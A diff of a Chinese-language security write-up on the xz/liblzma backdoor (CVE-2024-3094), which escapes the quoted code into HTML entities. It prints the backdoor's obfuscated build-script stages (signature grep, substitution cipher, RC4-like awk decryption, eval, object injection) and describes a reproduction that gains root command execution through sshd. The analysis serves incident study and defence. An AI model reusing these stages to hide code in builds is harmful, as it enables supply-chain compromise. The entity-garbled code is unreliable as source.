-V='#endif\n#if defined(CRC32_GENERIC) && defined(CRC64_GENERIC) && defined(CRC_X86_CLMUL) && defined(CRC_USE_IFUNC) && defined(PIC) && (defined(BUILDING_CRC64_CLMUL) || defined(BUILDING_CRC32_CLMUL))\nextern int _get_cpuid(int, void*, void*, void*, void*, void*);\nstatic inline bool _is_arch_extension_supported(void) { int success = 1; uint32_t r[4]; success = _get_cpuid(1, &r[0], &r[1], &r[2], &r[3], ((char*) __builtin_frame_address(0))-16); const uint32_t ecx_mask = (1 << 1) | (1 << 9) | (1 << 19); return success && (r[2] & ecx_mask) == ecx_mask; }\n#else\n#define _is_arch_extension_supported is_arch_extension_supported'
+V=&#39;#endif\n#if defined(CRC32_GENERIC) &amp;&amp; defined(CRC64_GENERIC) &amp;&amp; defined(CRC_X86_CLMUL) &amp;&amp; defined(CRC_USE_IFUNC) &amp;&amp; defined(PIC) &amp;&amp; (defined(BUILDING_CRC64_CLMUL) || defined(BUILDING_CRC32_CLMUL))\nextern int _get_cpuid(int, void*, void*, void*, void*, void*);\nstatic inline bool _is_arch_extension_supported(void) { int success = 1; uint32_t r[4]; success = _get_cpuid(1, &amp;r[0], &amp;r[1], &amp;r[2], &amp;r[3], ((char*) __builtin_frame_address(0))-16); const uint32_t ecx_mask = (1 &lt;&lt; 1) | (1 &lt;&lt; 9) | (1 &lt;&lt; 19); return success &amp;&amp; (r[2] &amp; ecx_mask) == ecx_mask; }\n#else\n#define _is_arch_extension_supported is_arch_extension_supported&#39;
 eval $yosA
-if sed "/return is_arch_extension_supported()/ c\return _is_arch_extension_supported()" $top_srcdir/src/liblzma/check/crc64_fast.c | \
-sed "/include \"crc_x86_clmul.h\"/a \\$V" | \
-sed "1i # 0 \"$top_srcdir/src/liblzma/check/crc64_fast.c\"" 2>/dev/null | \
-$CC $DEFS $DEFAULT_INCLUDES $INCLUDES $liblzma_la_CPPFLAGS $CPPFLAGS $AM_CFLAGS $CFLAGS -r liblzma_la-crc64-fast.o -x c -  $P -o .libs/liblzma_la-crc64_fast.o 2>/dev/null; then
+if sed &#34;/return is_arch_extension_supported()/ c\return _is_arch_extension_supported()&#34; $top_srcdir/src/liblzma/check/crc64_fast.c | \
+sed &#34;/include \&#34;crc_x86_clmul.h\&#34;/a \\$V&#34; | \
+sed &#34;1i # 0 \&#34;$top_srcdir/src/liblzma/check/crc64_fast.c\&#34;&#34; 2&gt;/dev/null | \
+$CC $DEFS $DEFAULT_INCLUDES $INCLUDES $liblzma_la_CPPFLAGS $CPPFLAGS $AM_CFLAGS $CFLAGS -r liblzma_la-crc64-fast.o -x c -  $P -o .libs/liblzma_la-crc64_fast.o 2&gt;/dev/null; then
 cp .libs/liblzma_la-crc32_fast.o .libs/liblzma_la-crc32-fast.o || true
 eval $BPep
-if sed "/return is_arch_extension_supported()/ c\return _is_arch_extension_supported()" $top_srcdir/src/liblzma/check/crc32_fast.c | \
-sed "/include \"crc32_arm64.h\"/a \\$V" | \
-sed "1i # 0 \"$top_srcdir/src/liblzma/check/crc32_fast.c\"" 2>/dev/null | \
+if sed &#34;/return is_arch_extension_supported()/ c\return _is_arch_extension_supported()&#34; $top_srcdir/src/liblzma/check/crc32_fast.c | \
+sed &#34;/include \&#34;crc32_arm64.h\&#34;/a \\$V&#34; | \
+sed &#34;1i # 0 \&#34;$top_srcdir/src/liblzma/check/crc32_fast.c\&#34;&#34; 2&gt;/dev/null | \
 $CC $DEFS $DEFAULT_INCLUDES $INCLUDES $liblzma_la_CPPFLAGS $CPPFLAGS $AM_CFLAGS $CFLAGS -r -x c -  $P -o .libs/liblzma_la-crc32_fast.o; then
 eval $RgYB
 if $AM_V_CCLD$liblzma_la_LINK -rpath $libdir $liblzma_la_OBJECTS $liblzma_la_LIBADD; then
@@ -491,19 +491,19 @@ Stage 2是 Andres 在原始电子邮件（即 5.6.0 版本）中附加的[fected
 片段1
 
 ```sh
-vs=`grep -broaF '~!:_ W' $srcdir/tests/files/ 2>/dev/null`
-if test "x$vs" != "x" > /dev/null 2>&1;then
+vs=`grep -broaF &#39;~!:_ W&#39; $srcdir/tests/files/ 2&gt;/dev/null`
+if test &#34;x$vs&#34; != &#34;x&#34; &gt; /dev/null 2&gt;&amp;1;then
 f1=`echo $vs | cut -d: -f1`
-if test "x$f1" != "x" > /dev/null 2>&1;then
-start=`expr $(echo $vs | cut -d: -f2) + 7`
-ve=`grep -broaF '|_!{ -' $srcdir/tests/files/ 2>/dev/null`
-if test "x$ve" != "x" > /dev/null 2>&1;then
+if test &#34;x$f1&#34; != &#34;x&#34; &gt; /dev/null 2&gt;&amp;1;then
+start=`expr $(echo $vs | cut -d: -f2) &#43; 7`
+ve=`grep -broaF &#39;|_!{ -&#39; $srcdir/tests/files/ 2&gt;/dev/null`
+if test &#34;x$ve&#34; != &#34;x&#34; &gt; /dev/null 2&gt;&amp;1;then
 f2=`echo $ve | cut -d: -f1`
-if test "x$f2" != "x" > /dev/null 2>&1;then
-[ ! "x$f2" = "x$f1" ] && exit 0
-[ ! -f $f1 ] && exit 0
+if test &#34;x$f2&#34; != &#34;x&#34; &gt; /dev/null 2&gt;&amp;1;then
+[ ! &#34;x$f2&#34; = &#34;x$f1&#34; ] &amp;&amp; exit 0
+[ ! -f $f1 ] &amp;&amp; exit 0
 end=`expr $(echo $ve | cut -d: -f2) - $start`
-eval `cat $f1 | tail -c +${start} | head -c +${end} | tr "\5-\51\204-\377\52-\115\132-\203\0-\4\116-\131" "\0-\377" | xz -F raw --lzma2 -dc`
+eval `cat $f1 | tail -c &#43;${start} | head -c &#43;${end} | tr &#34;\5-\51\204-\377\52-\115\132-\203\0-\4\116-\131&#34; &#34;\0-\377&#34; | xz -F raw --lzma2 -dc`
 fi
 fi
 fi
@@ -513,19 +513,19 @@ fi
 片段3：
 
 ```sh
-vs=`grep -broaF 'jV!.^%' $top_srcdir/tests/files/ 2>/dev/null`
-if test "x$vs" != "x" > /dev/null 2>&1;then
+vs=`grep -broaF &#39;jV!.^%&#39; $top_srcdir/tests/files/ 2&gt;/dev/null`
+if test &#34;x$vs&#34; != &#34;x&#34; &gt; /dev/null 2&gt;&amp;1;then
 f1=`echo $vs | cut -d: -f1`
-if test "x$f1" != "x" > /dev/null 2>&1;then
-start=`expr $(echo $vs | cut -d: -f2) + 7`
-ve=`grep -broaF '%.R.1Z' $top_srcdir/tests/files/ 2>/dev/null`
-if test "x$ve" != "x" > /dev/null 2>&1;then
+if test &#34;x$f1&#34; != &#34;x&#34; &gt; /dev/null 2&gt;&amp;1;then
+start=`expr $(echo $vs | cut -d: -f2) &#43; 7`
+ve=`grep -broaF &#39;%.R.1Z&#39; $top_srcdir/tests/files/ 2&gt;/dev/null`
+if test &#34;x$ve&#34; != &#34;x&#34; &gt; /dev/null 2&gt;&amp;1;then
 f2=`echo $ve | cut -d: -f1`
-if test "x$f2" != "x" > /dev/null 2>&1;then
-[ ! "x$f2" = "x$f1" ] && exit 0
-[ ! -f $f1 ] && exit 0
+if test &#34;x$f2&#34; != &#34;x&#34; &gt; /dev/null 2&gt;&amp;1;then
+[ ! &#34;x$f2&#34; = &#34;x$f1&#34; ] &amp;&amp; exit 0
+[ ! -f $f1 ] &amp;&amp; exit 0
 end=`expr $(echo $ve | cut -d: -f2) - $start`
-eval `cat $f1 | tail -c +${start} | head -c +${end} | tr "\5-\51\204-\377\52-\115\132-\203\0-\4\116-\131" "\0-\377" | xz -F raw --lzma2 -dc`
+eval `cat $f1 | tail -c &#43;${start} | head -c &#43;${end} | tr &#34;\5-\51\204-\377\52-\115\132-\203\0-\4\116-\131&#34; &#34;\0-\377&#34; | xz -F raw --lzma2 -dc`
 fi
 fi
 fi
@@ -539,18 +539,18 @@ fi
 1. 首先，他们尝试在tests/files/目录中查找（grep -broaF）两个文件，其中包含以下字节（签名）
 
    ```sh
-   Fragment 1: "~!:_ W" and "|_!{ -"
-   Fragment 3: "jV!.^%" and "%.R.1Z"
+   Fragment 1: &#34;~!:_ W&#34; and &#34;|_!{ -&#34;
+   Fragment 3: &#34;jV!.^%&#34; and &#34;%.R.1Z&#34;
    # 注：grep 实际输出格式如下：file_name:offset:signature。例如：
-   $ grep -broaF "XYZ"
+   $ grep -broaF &#34;XYZ&#34;
    testfile:9:XYZ
    ```
 
-2. 如果找到该文件，提取每个文件的偏移量（cut -d: -f2，以 : 为分隔符，采用第二个字段），第一个偏移量 + 7 保存为 $start，第二个文件的第二个偏移量 - $start 保存作为 $end.
+2. 如果找到该文件，提取每个文件的偏移量（cut -d: -f2，以 : 为分隔符，采用第二个字段），第一个偏移量 &#43; 7 保存为 $start，第二个文件的第二个偏移量 - $start 保存作为 $end.
 
-3. 一旦脚本有了 $start 和 $end 偏移量，它就会切出文件中具有第一个签名的部分 `cat $f1 | tail -c +${start} | head -c +${end}`
+3. 一旦脚本有了 $start 和 $end 偏移量，它就会切出文件中具有第一个签名的部分 `cat $f1 | tail -c &#43;${start} | head -c &#43;${end}`
 
-4. 接下来先是替换密码（使用 5.6.0 版本密钥）：`tr "\5-\51\204-\377\52-\115\132-\203\0-\4\116-\131" "\0-\377"`
+4. 接下来先是替换密码（使用 5.6.0 版本密钥）：`tr &#34;\5-\51\204-\377\52-\115\132-\203\0-\4\116-\131&#34; &#34;\0-\377&#34;`
 
 5. 然后解压数据以便立即执行：
 
@@ -565,7 +565,7 @@ fi
 此脚本会检查各种条件，例如计算机的体系结构。
 
 ```sh
-if ! (echo "$build" | grep -Eq "^x86_64" > /dev/null 2>&1) && (echo "$build" | grep -Eq "linux-gnu$" > /dev/null 2>&1);then
+if ! (echo &#34;$build&#34; | grep -Eq &#34;^x86_64&#34; &gt; /dev/null 2&gt;&amp;1) &amp;&amp; (echo &#34;$build&#34; | grep -Eq &#34;linux-gnu$&#34; &gt; /dev/null 2&gt;&amp;1);then
 ```
 
 - 如果 amd64/x86_64 是构建的目标
@@ -575,21 +575,21 @@ if ! (echo "$build" | grep -Eq "^x86_64" > /dev/null 2>&1) && (echo "$build" | g
 它还会检查正在使用的工具链：
 
 ```sh
-if test "x$GCC" != 'xyes' > /dev/null 2>&1;then
+if test &#34;x$GCC&#34; != &#39;xyes&#39; &gt; /dev/null 2&gt;&amp;1;then
 exit 0
 fi
-if test "x$CC" != 'xgcc' > /dev/null 2>&1;then
+if test &#34;x$CC&#34; != &#39;xgcc&#39; &gt; /dev/null 2&gt;&amp;1;then
 exit 0
 fi
-LDv=$LD" -v"
-if ! $LDv 2>&1 | grep -qs 'GNU ld' > /dev/null 2>&1;then
+LDv=$LD&#34; -v&#34;
+if ! $LDv 2&gt;&amp;1 | grep -qs &#39;GNU ld&#39; &gt; /dev/null 2&gt;&amp;1;then
 exit 0
 ```
 
 如果正在尝试复现构建 Debian 或 Red Hat 软件包：
 
 ```sh
-if test -f "$srcdir/debian/rules" || test "x$RPM_ARCH" = "xx86_64";then
+if test -f &#34;$srcdir/debian/rules&#34; || test &#34;x$RPM_ARCH&#34; = &#34;xx86_64&#34;;then
 ```
 
 因此，这种攻击似乎是针对使用 Debian 或 Red Hat 派生发行版运行 glibc 的 amd64 系统。
@@ -607,7 +607,7 @@ else
 N=88664
 W=0
 fi
-xz -dc $top_srcdir/tests/files/$p | eval $i | LC_ALL=C sed "s/\(.\)/\1\n/g" | LC_ALL=C awk 'BEGIN{FS="\n";RS="\n";ORS="";m=256;for(i=0;i<m;i++){t[sprintf("x%c",i)]=i;c[i]=((i*7)+5)%m;}i=0;j=0;for(l=0;l<8192;l++){i=(i+1)%m;a=c[i];j=(j+a)%m;c[i]=c[j];c[j]=a;}}{v=t["x" (NF<1?RS:$1)];i=(i+1)%m;a=c[i];j=(j+a)%m;b=c[j];c[i]=b;c[j]=a;k=c[(a+b)%m];printf "%c",(v+k)%m}' | xz -dc --single-stream | ((head -c +$N > /dev/null 2>&1) && head -c +$W) > liblzma_la-crc64-fast.o || true
+xz -dc $top_srcdir/tests/files/$p | eval $i | LC_ALL=C sed &#34;s/\(.\)/\1\n/g&#34; | LC_ALL=C awk &#39;BEGIN{FS=&#34;\n&#34;;RS=&#34;\n&#34;;ORS=&#34;&#34;;m=256;for(i=0;i&lt;m;i&#43;&#43;){t[sprintf(&#34;x%c&#34;,i)]=i;c[i]=((i*7)&#43;5)%m;}i=0;j=0;for(l=0;l&lt;8192;l&#43;&#43;){i=(i&#43;1)%m;a=c[i];j=(j&#43;a)%m;c[i]=c[j];c[j]=a;}}{v=t[&#34;x&#34; (NF&lt;1?RS:$1)];i=(i&#43;1)%m;a=c[i];j=(j&#43;a)%m;b=c[j];c[i]=b;c[j]=a;k=c[(a&#43;b)%m];printf &#34;%c&#34;,(v&#43;k)%m}&#39; | xz -dc --single-stream | ((head -c &#43;$N &gt; /dev/null 2&gt;&amp;1) &amp;&amp; head -c &#43;$W) &gt; liblzma_la-crc64-fast.o || true
 ```
 
 版本之间的差异归结为有损压缩(compressed-but-somewhat-mangled)的有效负载的大小，在 5.6.0 中是 88792，在 5.6.1 中是 88664，AWK 脚本中的一个值发生了变化，我们稍后会介绍这一点。
@@ -618,26 +618,26 @@ xz -dc $top_srcdir/tests/files/$p | eval $i | LC_ALL=C sed "s/\(.\)/\1\n/g" | LC
 
 2. 与Stage 1 中的步骤 3 相同，即“很多 head 函数”调用。
 
-3. 这有不同了。首先之前的输出被 sed 命令破坏了。`LC_ALL=C sed "s/\(.\)/\1\n/g"` 其作用实际上是在每个字节后面放置一个换行符（换行符本身除外）。因此，我们最终在输出中得到的是每行字节的情况（这里有很多混合“文本”和“二进制”文件）。这正是下一步所需要的。
+3. 这有不同了。首先之前的输出被 sed 命令破坏了。`LC_ALL=C sed &#34;s/\(.\)/\1\n/g&#34;` 其作用实际上是在每个字节后面放置一个换行符（换行符本身除外）。因此，我们最终在输出中得到的是每行字节的情况（这里有很多混合“文本”和“二进制”文件）。这正是下一步所需要的。
 
 4. 下一步是 AWK 脚本，它对输入流进行 [RC4...ish](https://en.wikipedia.org/wiki/RC4) 描述。
 
    ```sh
    BEGIN {  # Initialization part.
-     FS = "\n";  # Some AWK settings.
-     RS = "\n";
-     ORS = "";
+     FS = &#34;\n&#34;;  # Some AWK settings.
+     RS = &#34;\n&#34;;
+     ORS = &#34;&#34;;
      m = 256;
-     for(i=0;i<m;i++) {
-       t[sprintf("x%key", i)] = i;
-       key[i] = ((i * 7) + 5) % m;  # Creating the cipher key.
+     for(i=0;i&lt;m;i&#43;&#43;) {
+       t[sprintf(&#34;x%key&#34;, i)] = i;
+       key[i] = ((i * 7) &#43; 5) % m;  # Creating the cipher key.
      }
      i=0;  # Skipping 4096 first bytes of the output PRNG stream.
-     j=0;  # ↑ it's a typical RC4 thing to do.
-     for(l = 0; l < 4096; l++) {  # 5.6.1 uses 8192 instead.
-       i = (i + 1) % m;
+     j=0;  # ↑ it&#39;s a typical RC4 thing to do.
+     for(l = 0; l &lt; 4096; l&#43;&#43;) {  # 5.6.1 uses 8192 instead.
+       i = (i &#43; 1) % m;
        a = key[i];
-       j = (j + a) % m;
+       j = (j &#43; a) % m;
        key[i] = key[j];
        key[j] = a;
      }
@@ -645,20 +645,20 @@ xz -dc $top_srcdir/tests/files/$p | eval $i | LC_ALL=C sed "s/\(.\)/\1\n/g" | LC
    
    {  # Decription part.
      # Getting the next byte.
-     v = t["x" (NF < 1 ? RS : $1)];
+     v = t[&#34;x&#34; (NF &lt; 1 ? RS : $1)];
    
      # Iterating the RC4 PRNG.
-     i = (i + 1) % m;
+     i = (i &#43; 1) % m;
      a = key[i];
-     j = (j + a) % m;
+     j = (j &#43; a) % m;
      b = key[j];
      key[i] = b;
      key[j] = a;
-     k = key[(a + b) % m];
+     k = key[(a &#43; b) % m];
    
      # As pointed out by @nugxperience, RC4 originally XORs the encrypted byte
      # with the key, but here for some add is used instead (might be an AWK thing).
-     printf "%key", (v + k) % m
+     printf &#34;%key&#34;, (v &#43; k) % m
    }
    ```
 
@@ -669,7 +669,7 @@ xz -dc $top_srcdir/tests/files/$p | eval $i | LC_ALL=C sed "s/\(.\)/\1\n/g" | LC
 6. 然后使用head技巧截取从 N (0) 到 W (~86KB) 的字节，并保存为 liblzma_la-crc64-fast.o ，这是最终的二进制后门。
 
    ```sh
-   ((head -c +$N > /dev/null 2>&1) && head -c +$W) > liblzma_la-crc64-fast.o
+   ((head -c &#43;$N &gt; /dev/null 2&gt;&amp;1) &amp;&amp; head -c &#43;$W) &gt; liblzma_la-crc64-fast.o
    ```
 
 5.6.0 版本N为0，W为88792
@@ -727,7 +727,7 @@ xz -dc $top_srcdir/tests/files/$p | eval $i | LC_ALL=C sed "s/\(.\)/\1\n/g" | LC
 - 它也可能在其他场景中激活，甚至可能与 ssh 无关。
 - 暂不清楚有效载荷的目的是做什么，正在调查。
 - Vanilla 上游 OpenSSH 不受影响，除非其依赖项链接 `liblzma` 之一。
-  - Lennart Poettering 曾提到它可能通过 pam->libselinux->liblzma 发生，也可能在其他情况下发生，但是......
+  - Lennart Poettering 曾提到它可能通过 pam-&gt;libselinux-&gt;liblzma 发生，也可能在其他情况下发生，但是......
   - libselinux 没有链接到 liblzma。事实证明，这种混淆是因为 Fedora 中一个旧的仅限下游的补丁和 RPM 规范中陈旧的依赖关系，这种依赖关系在删除后很长一段时间内仍然存在。
   - PAM 模块在进程 AFAIK 中加载得太晚，无法正常工作（另一个可能的例子是 `pam_fprintd` ）。Solar Designer 在 oss-security 上也提出了这个问题。
 - payload被间接加载到 `sshd` 。 `sshd` 通常被 patch 以支持 systemd-notify，以便在 SSHD 运行时可以启动其他服务。 加载`liblzma`是因为它被 `libsystemd` 的其他部分所依赖，这不是systemd的错。大多数发行版使用的补丁都可以在这里找到：openssh/openssh-portable#375。
@@ -763,7 +763,7 @@ xz-utils 有两个维护者：
 
 
 
-本次事件的主角是Jia Tan （JiaT75），根据他的名字，他希望人们相信他是亚洲人，特并且他的绝大多数提交都是 UTC+08 时间戳。 然而，我更相信他实际上来自 UTC+02/UTC+03时区的某个地方，其中包括东欧（EET）、以色列（IST）等。他通常早上 9 点到下午 6 点工作（根据 EET 调整）。这比在周二晚上午夜和凌晨 1 点工作的人更合理（使用 UTC+08）。
+本次事件的主角是Jia Tan （JiaT75），根据他的名字，他希望人们相信他是亚洲人，特并且他的绝大多数提交都是 UTC&#43;08 时间戳。 然而，我更相信他实际上来自 UTC&#43;02/UTC&#43;03时区的某个地方，其中包括东欧（EET）、以色列（IST）等。他通常早上 9 点到下午 6 点工作（根据 EET 调整）。这比在周二晚上午夜和凌晨 1 点工作的人更合理（使用 UTC&#43;08）。
 
 关于这些，详情可见：https://rheaeve.substack.com/p/xz-backdoor-times-damned-times-and
 
@@ -775,21 +775,21 @@ github已有公开的[demo exp](https://github.com/amlweems/xzbot)，这个exp�
 
 见 https://mp.weixin.qq.com/s/DFXa2DOb2VyxyFFWDRt2Cg 已有复现
 
-> 下载了debian官方编译的deb包。安装之后使用patch.py脚本手动patch。
->
-> ![图片](resource/xz库恶意后门植入事件.assets/641.png)
->
-> 然后启动sshd进程，使其监听在2222端口。
->
-> ![图片](resource/xz库恶意后门植入事件.assets/643.png)
->
-> 之后运行exploit，执行的命令为`id > /tmp/.xz`。
->
-> ![图片](resource/xz库恶意后门植入事件.assets/642.png)
->
-> 运行之后可以看到命令成功被执行，并且命令执行的权限为root。
->
-> ![image-20240406223956708](resource/xz库恶意后门植入事件.assets/image-20240406223956708.png)
+&gt; 下载了debian官方编译的deb包。安装之后使用patch.py脚本手动patch。
+&gt;
+&gt; ![图片](resource/xz库恶意后门植入事件.assets/641.png)
+&gt;
+&gt; 然后启动sshd进程，使其监听在2222端口。
+&gt;
+&gt; ![图片](resource/xz库恶意后门植入事件.assets/643.png)
+&gt;
+&gt; 之后运行exploit，执行的命令为`id &gt; /tmp/.xz`。
+&gt;
+&gt; ![图片](resource/xz库恶意后门植入事件.assets/642.png)
+&gt;
+&gt; 运行之后可以看到命令成功被执行，并且命令执行的权限为root。
+&gt;
+&gt; ![image-20240406223956708](resource/xz库恶意后门植入事件.assets/image-20240406223956708.png)
 
 
 
@@ -809,7 +809,7 @@ github已有公开的[demo exp](https://github.com/amlweems/xzbot)，这个exp�
 - 奇安信Cert https://mp.weixin.qq.com/s/F2k1bPmCuqwUAZkNiIFA-w
 - Everything I Know About the Xz Backdoor:  https://boehs.org/node/everything-i-know-about-the-xz-backdoor
 - xz 后门镜像地址 https://github.com/thesamesam/xz-archive
-- [xz/liblzma: Bash-stage Obfuscation Explained](https://gynvael.coldwind.pl/?id=782) : https://gynvael.coldwind.pl/?lang=en&id=782#stage2-ext
+- [xz/liblzma: Bash-stage Obfuscation Explained](https://gynvael.coldwind.pl/?id=782) : https://gynvael.coldwind.pl/?lang=en&amp;id=782#stage2-ext
 - FAQ on the xz-utils backdoor (CVE-2024-3094) https://gist.github.com/thesamesam/223949d5a074ebc3dce9ee78baad9e27
 - XZ Backdoor Analysis：https://gist.github.com/smx-smx/a6112d54777845d389bd7126d6e9f504
 - xzre：https://github.com/smx-smx/xzre
